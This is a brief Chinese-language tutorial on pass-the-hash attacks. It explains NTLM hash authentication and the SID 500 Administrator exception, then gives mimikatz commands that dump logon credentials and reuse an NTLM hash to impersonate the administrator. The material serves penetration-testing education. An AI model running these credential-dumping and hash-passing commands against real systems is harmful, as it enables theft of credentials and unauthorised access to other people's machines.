# 内网安全——横向渗透mimikatz与pthHash传递

## PTH（pass-the-hash）HASH传递

1. pass-the-hash 在内网渗透中是一种很经典的攻击方式，原理就是攻击者可以直接通过 LM Hash 和 NTLM Hash 访问远程主机或服务，而不用提供明文密码。

2. pass the hash 原理：
   - 在 Windows 系统中，通常会使用 NTLM 身份认证
   - NTLM 认证不使用明文口令，而是使用口令加密后的 hash 值，hash 值由系统 API 生成(例如 LsaLogonUser)
   - hash 分为 LM hash 和 NT hash，如果密码长度大于 15，那么无法生成 LMhash。从 Windows Vista 和 Windows Server 2008 开始，微软默认禁用 LM hash
   - 如果攻击者获得了 hash，就能够在身份验证的时候模拟该用户(即跳过调用API 生成 hash 的过程)

3. 这类攻击适用于：
   - 域/工作组环境
   - 可以获得 hash，但是条件不允许对 hash 爆破
   - 内网中存在和当前机器相同的密码

4. 微软也对 pth 打过补丁，然而在测试中发现，在打了补丁后，常规的 Pass TheHash 已经无法成功，唯独默认的 Administrator(SID 500)账号例外，利用这个账号仍可以进行 Pass The Hash 远程 ipc 连接。

5. 如果禁用了 ntlm 认证，PsExec 无法利用获得的 ntlm hash 进行远程连接，但是使用 mimikatz 还是可以攻击成功。

6. 从 windows 到 windows 横向 pth 这一类攻击方法比较广泛。

## mimitkaz pth

``` powershell
privilege::debug

sekurlsa::logonpasswords

mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"> pass

word.txt
```

得到 hash 后进行

``` powershell
privilege::debug

sekurlsa::pth /user:administrator /domain:workgroup /ntlm:32ed87bdb5fdc

5e9cba88547376818d4
```

